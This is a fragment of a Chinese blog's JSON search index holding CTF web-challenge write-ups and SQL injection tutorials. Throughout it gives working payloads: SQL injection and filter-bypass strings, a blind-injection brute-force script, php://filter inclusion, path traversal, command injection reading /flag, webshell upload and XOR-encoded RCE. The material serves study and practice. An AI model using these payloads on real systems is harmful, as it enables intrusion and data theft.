新生赛-BackupFile","content":"\n题目为找出备份文件\n本题的备份文件为index.php.bak\n\n查看文件内容\n\n要求输入内容为数字，并与字符串123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\n由于&#x3D;&#x3D;是PHP中的弱类型比较，int和string无法直接比较，php会将string转换成int然后进行比较，123后面的内容会被截断，因此输入key&#x3D;123即可\n得到flag\n\n","slug":"ACTF2020-新生赛-BackupFile","date":"2023-03-16T11:28:49.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"302c7bdbfada1577452736dc43f46350","title":"极客大挑战 2019-PHP","content":"\n进入题目后，提示备份网站\n用dirmap对网站目录进行扫描发现www.zip\n下载后打开\n\n\n其中的flag文件为假php\n查看class.php中的内容\n&lt;?php\ninclude &#39;flag.php&#39;;\n\n\nerror_reporting(0);\n\n\nclass Name&#123;\n    private $username &#x3D; &#39;nonono&#39;;\n    private $password &#x3D; &#39;yesyes&#39;;\n\n    public function __construct($username,$password)&#123;\n        $this-&gt;username &#x3D; $username;\n        $this-&gt;password &#x3D; $password;\n    &#125;\n\n    function __wakeup()&#123;\n        $this-&gt;username &#x3D; &#39;guest&#39;;\n    &#125;\n\n    function __destruct()&#123;\n        if ($this-&gt;password !&#x3D; 100) &#123;\n            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;\n            echo &quot;You name is: &quot;;\n            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;\n            echo &quot;You password is: &quot;;\n            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;\n            die();\n        &#125;\n        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;\n            global $flag;\n            echo $flag;\n        &#125;else&#123;\n            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;\n            die();\n\n            \n        &#125;\n    &#125;\n&#125;\n?&gt;\n\n定义了一个类，在__destruct中要求password的值为100，username中的内容为admin\n其中__wakeup()函数会将username的值设置为guest\n但是class类中并没有输入参数的方式\n查看index.php，其中\n&lt;?php\n    include &#39;class.php&#39;;\n    $select &#x3D; $_GET[&#39;select&#39;];\n    $res&#x3D;unserialize(@$select);\n    ?&gt;\n\n包含了class.php，通过GET方式获取select，unserialize为反序列化函数\nserialize() 函数用于序列化对象或数组，并返回一个字符串。\nserialize() 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。\nunserialize() 函数用于将通过serialize() 函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。\n通过序列化函数构造要输入的结构\n\nvar_dump() 函数用于输出变量的相关信息。\nvar_dump() 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构\n\n其中的不可显示字符在url中可用%00表示\n\n 要绕过__wakeup只要让说明的参数个数大于实际的参数个数就行了。\n将\nO:4:”Name”:2:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name %00password”;s:3:”100”;}\n改为\nO:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}\n得到flag\n\n","slug":"极客大挑战-2019-PHP","date":"2023-03-10T11:12:40.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"3366e220449692ebde433e9d5658615a","title":"极客大挑战 2019-BabySQL","content":"\n进入题目，发现是SQL注入问题\n尝试使用万能密码\n\n\n发现在报错信息中没有出现or，判断有关键字过滤\n尝试双写绕过\n\n成功登录\n\n测试列数\n1’ oorrder bbyy 4 – +\n\n1’ oorrder bbyy 3 – +\n成功进入即有三列\n获取数据库名\n1’ uunionnion seselectlect 1,2,database(); – +\n\n暴表\n1’ uunionnion seselectlect 1,2,group_concat(table_name) ffromrom infoorrmation_schema.tables whwhereere table_schema&#x3D;’geek’; – +\n\n暴字段\n1’ uunionnion seselectlect 1,2,group_concat(column_name) ffromrom infoorrmation_schema.columns whwhereere table_schema&#x3D;’geek’ aandnd table_name&#x3D;’b4bsql’; – +\n\n暴数据\n1’ uunionnion seselectlect 1,2,group_concat(id,username,passwoorrd) ffromrom geek.b4bsql; – +\n得到flag\n\n","slug":"极客大挑战-2019-BabySQL","date":"2023-03-09T11:25:55.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"292a9555889fdfb0c71e8124f78ac96a","title":"ACTF2020 新生赛-Upload","content":"\n进入题目，是文件上传的题目\n\n要求上传jpg、png、gif结尾的图片\n准备一个图片马\n尝试使用burp抓包后修改文件后缀\n发现在数据包抓取之前就有了如上图提示\n查看网页源码，发现存在验证函数\n\n删除验证函数后再次上传\n\n将文件后缀改为php\n\n对后缀名也进行了检查，重新上传，将后缀改为phtml\n\n上传成功，用蚁剑进行连接\n获得flag\n\n","slug":"ACTF2020-新生赛-Upload","date":"2023-03-07T11:16:43.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"c95b34ab7e2b154ed76594fecb51845d","title":"极客大挑战 2019-Upload","content":"\n进入题目判断为文件上传\n\n准备一个php文件，写入一句话木马\n\n\n要求上传img文件\n测试后发现通过抓包修改文件类型，更改文件后缀都无法上传\n并且会检验文件中是否包含&lt;?\n换一种形式的一句话木马并且加入gif的文件头\n\n使用burpsuite抓包修改文件类型和文件后缀名\n\n\n上传成功\n\n使用蚁剑进行连接\n\n找到flag\n","slug":"极客大挑战-2019-Upload","date":"2023-03-04T11:46:03.000Z","categories_index":"","tags_index":"文件上传","author_index":"Aurora"},{"id":"a80f3a72f6c2f15b28cf0b330add4b04","title":"极客大挑战 2019-Http","content":"\n进入题目，查看网页源码，发现一个名为Secret的页面\n\n访问该页面\n\n提示\n内容不是来自https://Sycsecret.buuoj.cn\n需要修改当前请求的发起页面，使用BurpSuite抓包，送入Repeater中\n\n在原始请求头中加入请求报头信息\nReferer:https://Sycsecret.buuoj.cn\n\n点击send，回显信息为\n\n要求使用Syclover浏览器\n在User-Agent中修改\n\n回显内容为\n\n内容仅能在本地查看，从本地请求，即让服务器端读取的IP为本地地址127.0.0.1，加入请求报头信息:X-Forwarded-For: 127.0.0.1\nX-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段\n\n得到flag\n\n","slug":"极客大挑战-2019-Http","date":"2023-02-25T11:50:57.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"e1489de033bf5f722dee9d9acdb521b0","title":"极客大挑战 2019-Knife","content":"进入题目，看到\neval($_POST[“Syc”]);\n\n是一个一句话木马，尝试用webshell管理工具连接\n\n在文件管理中找到flag\n\n","slug":"极客大挑战-2019-Knife","date":"2023-02-25T11:27:02.000Z","categories_index":"","tags_index":"一句话木马","author_index":"Aurora"},{"id":"6130d83e6b006bf68567615b79ecffd6","title":"极客大挑战 2019-LoveSQL","content":"\n进入题目\n尝试使用万能密码\n\n\n成功登录，但并没有找到flag\n返回登录页尝试寻找注入点\n\n闭合符号为单引号’\n\n用得到的账号密码测试注入点\n\n在’和– +之间输入注入语句\n1’ union select 1,2,database() – +\n\n对geek库进行暴表\n1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘geek’ – +\n\n对暴字段l0ve1ysq1\n1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘l0ve1ysq1’ and table_schema &#x3D; ‘geek’ – +\n\n暴数据\n1’ union select 1,2,group_concat(id,username,password) from geek.l0ve1ysq1 – +\n\n得到flag\n","slug":"极客大挑战-2019-LoveSQL","date":"2023-02-22T09:31:30.000Z","categories_index":"","tags_index":"SQL注入","author_index":"Aurora"},{"id":"a743a232eaf01afd5b4e91218c013765","title":"极客大挑战 2019-Secret File","content":"进入题目，场景如下\n\n查看网页源代码，发现一个名为.&#x2F;Archive.php的文件\n\n访问它\n\n点击SECRET\n\n并没有发现结果\n返回Archive.php页查看源代码\n\n点击SECRET时应该发生了跳转但是速度太快\n使用burpsuite进行抓包\n\n在intruder中点击send\n\n在response中看到结果\n发现一个名为secr3t.php的文件\n访问\n\n其中用文件包含的方式引用变量file中的内容\n通过PHP协议进行访问\n构造payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php\n得到flag中的内容\n\nbase64解码得到flag\n\n","slug":"极客大挑战-2019-Secret-File","date":"2023-02-18T11:29:49.000Z","categories_index":"","tags_index":"文件包含","author_index":"Aurora"},{"id":"b29060298de9e00f80f87c6f910421e7","title":"GXYCTF2019-Ping Ping Ping","content":"\n进入题目随便输入一个ip地址\n\n推测使用exec执行命令\n输入?ip&#x3D;127.0.0.1;ls得\n\n尝试用cat访问flag.php\n\n过滤了空格\n经过测试() &#x2F;等符号也都被过滤\n\n过滤了flag这个单词\n\nLinux中对空格的绕过方法：\n(1)${IFS}\n(2)$IFS$数字\n(3)&lt;\n(4)&lt;&gt;重定向符\n(5){xxx,xxx}用逗号实现空格的功能\n经测试{}&lt;&gt;都被过滤\n用$IFS$数字的方式来实现，并且通过用变量的内容进行连接来绕过对flag的过滤\n构造payload ?ip&#x3D;127.0.0.1;b&#x3D;ag;cat$IFS$1fl$b.php\n得到flag\n\n","slug":"GXYCTF2019-Ping-Ping-Ping","date":"2023-02-17T11:42:43.000Z","categories_index":"","tags_index":"exec,空格绕过","author_index":"Aurora"},{"id":"9c12cc8931e1d45af488da74ebbb23fe","title":"SUCTF 2019-EasySQL1","content":"进入题目\n\n输入数字1，有回显内容\n\n输入其他数字效果相同\n输入字母没有回显内容\n\n输入or and union等等字段回显Nonono\n\n判断这些关键字都被过滤掉了，无法进行联合查询\n尝试堆叠查询\n输入1;show tables;\n\n输入1;show columns from Flag;\n无法查看Flag表中的字段\n\n看大佬们的做法后发现本题考查的是sql_mode\nsql_mode是一组mysql支持的基本语法及校验规则\nPIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符\n当 sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数        当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR\n猜测后端的执行语句为：\nselect $_GET[&#39;query&#39;] || flag from flag\n\n在没有设置PIPES_AS_CONCAT时，后端语句的||的作用是 或\n当输入1，后端执行的语句就是select 1 from flag\n设置为PIPES_AS_CONCAT时输入1就变成了select concat(1,flag) from flag\n输入1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1\n\n另一种做法拼接*,1\n\n","slug":"SUCTF-2019-EasySQL1","date":"2023-02-14T08:25:57.000Z","categories_index":"","tags_index":"sQL注入","author_index":"Aurora"},{"id":"d2622bc92b9e5688d6557c15077022e8","title":"强网杯 2019-随便注1","content":"进入题目发现输入框中默认有一个数字1，点击提交查询有内容回显\n\n输入1’\n\n判断闭合符号为单引号’\n输入1‘ or 1&#x3D;1 – +\n\n查询出了当前表中的所有数据\n用order by查看显示列数\n1’ order by 3; – +\n\n1’ order by 2; – +\n\n列数为2\n尝试利用union联合查询获取库名\n1’ union select 1,databases(); – +\n\nselect被过滤，无法使用联合查询\n尝试堆叠注入\n堆叠注入原理：在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。\n1’; show tables; – +\n得到所有表名\n\n1’;show columns from `words`; – +\n\n1’;show columns from `1919810931114514`; – +\n\n注意：在windows系统下，反单引号（&#96;）是数据库、表、索引、列和别名用的引用符\n发现要获取的flag在1919810931114514表中\nwords表的表结构中有id和data两列\n猜测提交查询的窗口默认是在words表中查询数据的\n那么查询语句很有可能是select id,data from words where id &#x3D; \n可以利用堆叠查询，将1919810931114514表更名为words，words更名为其他来获取flag\n1’;rename table words to words1;rename table  `1919810931114514` ;alter table words change flag id varchar(100)\n\n再通过1‘ or 1&#x3D;1 – +查看得到flag\n\n","slug":"强网杯-2019-随便注1","date":"2023-02-11T11:38:55.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"8ee11d581b86b5771cc67e49ad808b9c","title":"ACTF2020新生赛-Exec 1","content":"观察题目是一个执行ping命令的页面\n\n\nPHP可以模拟DOS命令中的ping命令，采用的是php的内置函数exec来调用系统的ping命令的。于是采用exec内置函数来执行\n对于exec函数：\n;前面和后面命令都要执行，无论前面真假       |直接执行后面的语句       ||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句       &amp;前面和后面命令都要执行，无论前面真假       &amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令\n输入127.0.0.1 | ls得\n\n输入127.0.0.1 | ls &#x2F;得\n\n输入127.0.0.1 | cat &#x2F;flag获取flag\n\n","slug":"ACTF2020新生赛-Exec-1","date":"2023-02-09T11:27:22.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"3b358db34dbaa4f263b8ee295f3f2131","title":"ACTF2020 新生赛-Include1","content":"进入题目，点击提示tips\n\n发现url中输入了file&#x3D;flag.php\n推测为文件包含，文件包含读取的是文件里的内容，可以通过base64编码的方式来读取文件flag.php\n?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php\n\nphp:&#x2F;&#x2F;filter为固定格式，convert.base64-encode为过滤器，resource&#x3D;flag.php是参数\n读取到的内容为\n\n用base64解码得到flag\n\n","slug":"ACTF2020-新生赛-Include1","date":"2023-02-08T11:19:25.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"a8af1a6f64d93e24706a1f4356026a5b","title":"HCTF-2018-WarmUp 1","content":"打开题目页面中只有一张图片，\n\nF12查看页面源码\n\n访问source.php\n &lt;?php\n    highlight_file(__FILE__);\n    class emmm\n    &#123;\n        public static function checkFile(&amp;$page)\n        &#123;\n            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];\n            if (! isset($page) || !is_string($page)) &#123;\n                echo &quot;you can&#39;t see it&quot;;\n                return false;\n            &#125;\n\n            if (in_array($page, $whitelist)) &#123;\n                return true;\n            &#125;\n\n            $_page &#x3D; mb_substr(\n                $page,\n                0,\n                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)\n            );\n            if (in_array($_page, $whitelist)) &#123;\n                return true;\n            &#125;\n\n            $_page &#x3D; urldecode($page);\n            $_page &#x3D; mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)\n            );\n            if (in_array($_page, $whitelist)) &#123;\n                return true;\n            &#125;\n            echo &quot;you can&#39;t see it&quot;;\n            return false;\n        &#125;\n    &#125;\n\n    if (! empty($_REQUEST[&#39;file&#39;])\n        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])\n        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])\n    ) &#123;\n        include $_REQUEST[&#39;file&#39;];\n        exit;\n    &#125; else &#123;\n        echo &quot;&lt;br&gt;&lt;img src&#x3D;\\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\\&quot; &#x2F;&gt;&quot;;\n    &#125;  \n?&gt; \n\n分析代码，第一段定义了一个类，类中定义了一个函数checkFile(&amp;$page)，其中定义了一个$whitelist白名单数组，数组内容是source.php和hint.php，查看hint.php\n\n! isset($page) || !is_string($page)判断输入的$page变量是否已设置且是一个字符串，in_array判断$page的内容是否在白名单中。\nmb_strpos 用于查找字符串在另一个字符串中首次出现的位置， $page . ‘?’ 会在后面自动对我们搜索文件路径添加一个 ?mb_strpos($page . ‘?’, ‘?’) 就是匹配第一次出现问号的位置。和前面的mb_substr函数一配合就会 从一开始截取到第一次问号的位置\nin_array($_page, $whitelist)判断输入的内容是否在白名单数组中，是的话返回true\n截取完之后就又会进行一次判断 if (in_array($_page, $whitelist))\n如果 $_page 在白名单里面就返true，换句话说就是检查我们输入的文件路径是否还包含 source.php或者hint.php\n因为有 mb_substr() mb_strpos() 函数所以不能直接使用问号，于是尝试对?进行两次url编码，结果为%253F\n第二段调用类中定义的函数，通过变量file输入内容\n?file&#x3D;source.php%253F..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg\n得到flag\n\n","slug":"HCTF-2018-WarmUp-1","date":"2023-02-07T11:17:47.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"688e9a26544b13828bb5688670613069","title":"极客大挑战 2019-EasySQL1","content":"\n进入题目后发现有用户名和密码两个可输入项，明显与数据库有交互，进行SQL注入判断闭合符\n\n\n报错信息为111’由此可知闭合符号为单引号’尝试使用万能密码1’ or ‘a’ &#x3D; ‘a’#\n\n万能密码的原理：SQL语句中#后的语句全部被注释掉，输入1’保证闭合完整不报错，or是或运算符，只要or前后有一项为真即可，上面语句中’a’&#x3D;’a’为恒等式，所以username是否为真就不再重要，因此称为万能密码。\n","slug":"极客大挑战-2019-EasySQL1","date":"2023-02-06T11:37:11.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"b489cff445cdd5efb0eecf16026a5aca","title":"SQL注入其三","content":"盲注脚本编写\n在长度未知的情况下，截取结果的某一位 “str” 与ascii码 [32, 128) 比较，如果所有可见字符都与结果不匹配，则说明结果是空值，也就是已超出最大长度，此时停下脚本即可根据情况选择脚本正确判断的条件，比如某些字符出现时代表页面正常或根据页面返回长度判断\n例：对sqllab靶场第八关sqli-less8的当前数据库名进行爆破的盲注脚本\nimport requests\n\ndef get_info(sql):\n    result,flag &#x3D; &quot;&quot;,True\n    for i in range(1,1000):\n        if(flag):\n            flag &#x3D; False\n            for j in range(32,128):\n                res &#x3D; requests.get(f&quot;http:&#x2F;&#x2F;www.sqli.com&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((&#123;sql&#125;),&#123;i&#125;,1))&#x3D;&#123;j&#125; -- + &quot;)\n                if(&quot;You are in&quot; in res.text):\n                    flag &#x3D; True\n                    result +&#x3D; chr(j)\n                    print(result)\n                    break\n        else:\n            print(f&quot;数据长度为&#123;i-2&#125;位，脚本运行结束&quot;)\n            break\n    return result\n\nget_info(&quot;select database()&quot;)\n\n脚本运行结果：\n\n有时因为网络环境因素，经常会遇到连接超时的情况，则可能需要用到超时重发\nimport requests\n\nsession &#x3D; requests.Session()\na &#x3D; requests.adapters.HTTPAdapter(max_retries &#x3D; 3)\nb &#x3D; requests.adapters.HTTPAdapter(max_retries &#x3D; 3)\nsession.mount(&#39;http:&#x2F;&#x2F;&#39;,a)\nsession.mount(&#39;https:&#x2F;&#x2F;&#39;,b)\n\ndef get_info(sql):\n    result,flag &#x3D; &quot;&quot;,True\n    for i in range(1,1000):\n        if(flag):\n            flag &#x3D; False\n            for j in range(32,128):\n                try:\n                    res &#x3D; session.get(f&quot;http:&#x2F;&#x2F;www.sqli.com&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((&#123;sql&#125;),&#123;i&#125;,1))&#x3D;&#123;j&#125; -- +&quot;)\n                except Exception as e:\n                    exit(&quot;网络请求错误，程序退出&quot;)\n                \n                if(&quot;You are in&quot; in res.text):\n                    flag &#x3D; True\n                    result +&#x3D; chr(j)\n                    print(result)\n                    break\n        else:\n            print(f&quot;数据长度为&#123;i-2&#125;，脚本运行结束&quot;)\n            break\n    return result\n\nget_info(&quot;select version()&quot;)\n\n\n也可已通过使用二分法来提高查找效率\n脚本执行的结果可以通过os.path文件路径来保存到指定文件中\nimport os\n# 当前文件绝对路径\nprint(os.path.abspath(__file__))\n# 当前文件所在目录\nprint(os.path.dirname(os.path.abspath(__file__)))\n\n","slug":"SQL注入其三","date":"2023-02-06T11:19:41.000Z","categories_index":"","tags_index":"SQL注入","author_index":"Aurora"},{"id":"c35bf4cdcf9610d9342e4b2e541833f0","title":"SQL注入其二","content":"1. 报错注入\nmysql中的一些函数在报错时，会抛出错误代码，借此可以执行一些特定的sql语句来获取数据库的信息，在有些时候虽然存在注入点能够执sql语句，但是页面中并没有打印sql执行结果的回显位置，但是如果页面能够抛出报错的代码信息，就可以利用报错回显，来查看注入的sql语句的执行结果\n报错注入常用函数\n1.floor()\n\nselect * from test where id&#x3D;1 and (select 1 from (select count(*),concat((select\n\nuser()),floor(rand(0)*2))x from information_schema.tables group by x)a);\n\n2.extractvalue()\n\nselect * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select\n\nuser()),0x7e)));\n\n3.updatexml()\n\nselect * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select\n\nuser()),0x7e),1));\n\n4.geometrycollection()\n\nselect * from test where id&#x3D;1 and geometrycollection((select * from(select *\n\nfrom(select user())a)b));\n\n5.multipoint()\n\nselect * from test where id&#x3D;1 and multipoint((select * from(select * from(select\n\nuser())a)b));\n\n6.polygon()\n\nselect * from test where id&#x3D;1 and polygon((select * from(select * from(select\n\nuser())a)b));\n\n7.multipolygon()\n\nselect * from test where id&#x3D;1 and multipolygon((select * from(select *\n\nfrom(select user())a)b));\n\n8.linestring()\n\nselect * from test where id&#x3D;1 and linestring((select * from(select * from(select\n\nuser())a)b));\n\n9.multilinestring()\n\nselect * from test where id&#x3D;1 and multilinestring((select * from(select *\n\nfrom(select user())a)b));\n\n10.exp()\n\nselect * from test where id&#x3D;1 and exp(~(select * from(select user())a));\n\n2. 布尔盲注\n布尔盲注一般适用于页面没有回显字段不支持联合查询和报错注入，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 或 false 使web页面返回 true 或 false，从而达到注入的目的来获取信息，单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and 1 及 and 0来，判断sql语句有没有成功执行，如果sql语句执行了说明闭合符号找对了\n查询数据内容\n由于没有回显，我们只能利用一些函数来构造等式，判断数据内容\nlength() 函数返回一个字符串的长度，可以以用来判断字符串 sql 查询结果的长度\nand length(database())&#x3D;8 – + # 判断当前数据库名长度\nsubstr() \\ left() 函数 截取查询结果字符进行判断\nand substr(database(),1,1)&#x3D;’a’ – + # 使用指定字符一位一位判断截取到的字符\nand left(database(),8)&#x3D;’security’ – + # 截取指定长度结果，进行判断\n# 可使用ascii函数，查询截取到字符的ascii码\nascii(substr(database(),1,1))&#x3D;115 – + # 使用ascii码一位一位比对截取到的字符\n然后用burp盲注爆破\n3. 延时注入\n延时注入是盲注的一种，在页面没有回显和报错，也不能通过拼接 and 0 、and 1 的布尔表达式来判断，sql语句是否成功执行，只能在参数后and sleep(5) ， 加上延时函数sleep()， 如果sql语句执行页面刷新就会有一定的延时，根据页面是否有延时来判断sql语句执行与否所以叫做延时注入\n单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and sleep(5) 来判断sql语句有没有成功执行，如果sql语句执行了说明闭合符号找对了\n由于没有回显，我们只能利用一些函数来构造等式，判断数据内容\nlength() 函数返回一个字符串的长度，可以以用来判断字符串 sql 查询结果的长度\nand if(length(database()) &#x3D; 8, sleep(3),1) – + # 判断当前数据库名长度\n同布尔盲注可用burp进行延时注入的爆破，虽然burp爆破的方式可以实现注入，但结果不利于信息的获取，可利用注入脚本进行操作\n","slug":"SQL注入其二","date":"2023-01-15T07:43:08.000Z","categories_index":"","tags_index":"SQL注入","author_index":"Aurora"},{"id":"50f911bc61e762a93882fb5a0615065b","title":"SQL注入其一","content":"1.SQL注入流程\n得到目标网站的一般信息和技术分析信息之后，就要寻找注入点和测试注入点，这些点位都是与数据库有交互的地方（且参数可控）一般在三个地方寻找注入点：(1)表单中的输入参数 (2)URL中的参数 (3) Cookie或header头中其它参数\n2.测试注入点&amp;&amp;判断闭合符号\n常用的测试符号 单引号’ 双引号’’ 无符号（直接拼接） 圆括号() 这些符号通常是服务器后台代码中用来包裹用户输入变量的字符，当插入正确的闭合字符时，会破坏原有的sql语句;\n-- +会将后接的内容视为注释，-- +注释掉了后边的语句，使sql能够正常执行\n3.万能密码原理\nSELECT * FROM users WHERE username &#x3D; &#39;admin&#39; or 1#&#39; and password &#x3D; &#39;$password&#39; limit 0,1;\n\n去掉被注释的内容，sql语句如下：\n# 由于admin账号存在，所以该语句恒为真，故登陆成功，这在sql注入中被称为万能密码\nSELECT * FROM users WHERE username &#x3D; &#39;admin&#39; or 1\n\nSELECT * FROM users WHERE username &#x3D; &#39;admin&#39; and password &#x3D; &#39;123&#39; or 1#&#39; limit 0,1;\n\n4.UNION 联合查询注入\n联合查询是使用 union 或者 union all 拼接两条 select 语句来进行查询注入方式，效率非常高,后一条select语句的查询结果列数要与前一条相同\n二分法查找列数：先 order by 一个比较大的数字m，若报错再取其中位数 n 继续 order by， 若正常说明列数在 [n, m) 之间， 再取 n , m 之间的中位数 order by 如此反复多次，即可获取列数\n5.查询数据库内容常用语句\n1.暴库：select group_concat(schema_name) from information_schema.schemata;\n\n2.暴表1：select group_concat(table_name) from information_schema.tables where\n\ntable_schema&#x3D;&#39;security&#39;; 加引号 table_schema&#x3D;database()表示查询当前网站使用的数据库\n\n暴表2：select table_name from information_schema.tables where\n\ntable_schema&#x3D;&#39;security&#39; limit 3,1; 加引号\n\n3.暴字段1：select group_concat(column_name) from information_schema.columns where\n\ntable_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;; 加引号\n\n暴字段2：select column_name from information_schema.columns where\n\ntable_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39; limit 1,1;\n\n4.暴字段值（暴数据）：select group_concat(username,0x3a,password) from security.users; &#x2F;&#x2F;不加引号\n\n\n\n\n\n","slug":"SQL注入其一","date":"2023-01-14T01:50:00.000Z","categories_index":"","tags_index":"SQL注入","author_index":"Aurora"},{"id":"a02765d3f17045091b7948695d0675cc","title":"SSTI的理解","content":"SSTI的理解：\nSSTI和SQL注入原理差不多，都是因为对输入的字符串控制不足，把输入的字符串当成命令执行。\nSSTI引发的真正原因：render_template渲染函数的问题\nrender_template渲染函数是什么：就是把HTML涉及的页面与用户数据分离开，这样方便展示和管理。当用户输入自己的数据信息，HTML页面可以根据用户自身的信息来展示页面，因此才有了这个函数的使用。\nrender_template：\n渲染函数在渲染的时候，往往对用户输入的变量不做渲染，即： {{}}在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{{}}包裹的内容当做变量解析替换。比如{{1+1}}会被解析成2。因此才有了现在的模板注入漏洞。对于往往变量，我们使用{{这里是内容}}，因为{{}}包裹的东西会被解析，因此我们就可以实现类似于SQL注入的漏洞\n题目页面\n\n测试发现页面传入的参数为search\n\n使用config查看全局变量\n查看secret_key\nsearch&#x3D;{{config.SECRET_KEY}}\n\n","slug":"SSTI的理解","date":"2023-01-14T01:31:42.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"be2622c109e5481786c1d7440a312fa3","title":"无字母数字RCE","content":"题目：\n&lt;?php\nerror_reporting(0);\nif(isset($_GET[&#39;code&#39;]))&#123;\n        $code&#x3D;$_GET[&#39;code&#39;];         \n        if(preg_match(&quot;&#x2F;[a-z0-9]&#x2F;is&quot;,$code))&#123;\n            die(&quot;NO.&quot;);\n        &#125;\n        @eval($code);\n&#125;\nelse&#123;\n        highlight_file(__FILE__);\n&#125;\n?&gt;\n\n\n无字母数字进行RCE\neval函数中的内容会被视为php代码进行执行，只要令code的内容为需要进行的操作可以利用除字母数字以外的字符（ASCII码1~256中的字符）进行运算操作而凑出想要的字符，可以让code的值为\n$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo\n即：$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo\n\n采用url编码异或的方式得到%0c%08”^”%60%7b &#x2F;&#x2F;ls\n$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%22%0c%08&quot;^&quot;%60%7b%22);&amp;%ff&#x3D;system\n\n即\n$&#123;_GET&#125;&#123;%ff&#125;(&quot;ls&quot;);&amp;%ff&#x3D;system\n\n执行结果\n\n查看上一层中的文件\n\n%0c%08%01%00&quot;^&quot;%60%7b%21%2f &#x2F;&#x2F;ls &#x2F;\n\n%03%01%09%01%00%06%06%06%06%0c%0c%0c%0c%01%01%01%01%07%07%07%07&quot;^&quot;%60%60%7d%21%2f%60%60%60%60%60%60%60%60%60%60%60%60%60%60%60%60 &#x2F;&#x2F; cat &#x2F;ffffllllaaaagggg\n\n\n\n","slug":"无字母数字RCE","date":"2023-01-14T01:04:37.000Z","categories_index":"","tags_index":"","author_index":"Aurora"}]